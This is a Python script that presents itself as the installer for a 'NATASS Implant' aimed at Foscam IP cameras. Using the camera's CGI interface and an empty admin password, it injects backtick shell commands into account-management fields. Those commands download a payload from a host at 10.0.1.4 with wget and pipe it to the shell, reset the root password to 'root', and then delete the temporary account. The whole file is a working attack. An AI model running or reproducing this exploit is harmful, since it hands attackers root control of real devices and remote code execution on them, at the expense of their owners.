import requests

class Installer:
    def __init__(self):
        return
    
    def Install(self, connection_information, credentials):
        # Installs our beachhead to the target.
        
        # Connection
        (IP, Port) = connection_information
        self.BaseURL = f'http://{IP}:{Port}/cgi-bin/CGIProxy.fcgi'

        print(f"[+] Installing the NATASS Implant to {IP}:{Port}...")
        self.Send('echo+"root:root"|chpasswd', credentials)

        return
    
    def Send(self, cmd, credentials):    
        fmt = "+".join(cmd.split(" "))
        command = f'{self.BaseURL}?usr=admin&pwd=&cmd=addAccount&usrName=ssmith&usrPwd=`wget+http://10.0.1.4/FOSCAM_3.41.2a+-O+-+|+ash`&privilege=2'
        print(f'[D] {command}')
        print(requests.get(command))
        #Only needed to give us debug access during development, in the real implant, not necessary because the implant gives us root access already
        command = f'{self.BaseURL}?cmd=changePassword&usr=admin&pwd=&usrName=ssmith&oldPwd=`wget+http://10.0.1.4/FOSCAM_3.41.2a+-O+-+|+ash`&privilege=2&newPwd=`echo+"root:root"|chpasswd`'
        print(f'[D] {command}')
        print(requests.get(command))
        command = f'{self.BaseURL}?cmd=delAccount&usrName=ssmith&usr=admin&pwd='
        print(f'[D] {command}')
        print(requests.get(command))

def main():
    natass_installer = Installer()
    natass_installer.Install(('10.0.1.2', 88), { 'user' : 'admin', 'password' : '' })
    return

if __name__ == "__main__":
    main()

